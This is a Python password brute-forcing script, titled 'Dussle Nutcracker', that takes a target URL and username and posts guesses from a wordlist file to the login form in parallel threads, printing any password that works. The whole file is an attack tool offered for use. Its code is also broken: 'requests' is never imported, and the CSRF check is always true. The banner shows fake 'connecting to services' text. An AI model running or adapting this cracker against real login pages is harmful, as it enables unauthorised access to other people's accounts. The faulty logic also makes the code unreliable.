######################################################################################################
# Title: Dussle Nutcracker                                                                           #
# Author: F5                                                                                         #
#                                                                                                    #
######################################################################################################

print (""" 
███     ██  ██    ██  ██████████   ███████  ████████    ███████    ███████  ██   ██  █████████  ████████
██ ██   ██  ██    ██      ██      ██        ██     ██  ██     ██  ██        ██  ██   ██         ██     ██
██ ██   ██  ██    ██      ██      ██        ██     ██  ██     ██  ██        ██ ██    ██         ██     ██
██  ██  ██  ██    ██      ██      ██        ██     ██  ██     ██  ██        ████     ██         ██     ██
██  ██  ██  ██    ██      ██      ██        ████████   █████████  ██        ████     ██████     ████████
██   ██ ██  ██    ██      ██      ██        ██     ██  ██     ██  ██        ██ ██    ██         ██     ██
██   ██ ██  ██    ██      ██      ██        ██     ██  ██     ██  ██        ██  ██   ██         ██     ██
██    ████   ██████       ██       ███████  ██     ██  ██     ██   ███████  ██   ██  █████████  ██     ██

                                F5 Works
""")

import threading
import time
import sys

class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, password):
        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
        response = requests.post(self.url, data=data_dict)
        if self.error_message in str(response.content):
            return False
        elif "CSRF" or "csrf" in str(response.content):
            print("CSRF Token Issue")
            sys.exit()
        else:
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            return True

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            return

def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message(use NT for Default): ")
    cracker = BruteForceCracker(url, username, error)
    
    with open("NutcrackerSaves.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    banner = """ 
                          Connecting to:
                    Lana Bot Dussle Services...
                             Done!
                 Connected to Device Intern Services
                      (This Happens twice)
(If Internet connection is missing it may lead to crashes of the Programm and the Device)

               ████            ████            ████                      
        [+]████    ████    ████    ████    ████    ████[+]
                       ████            ████
"""
    print(banner)
    main()






           ##########           #
           #                    #
           #                    #
           ##########           #
           #                    #
           #
           #
           #
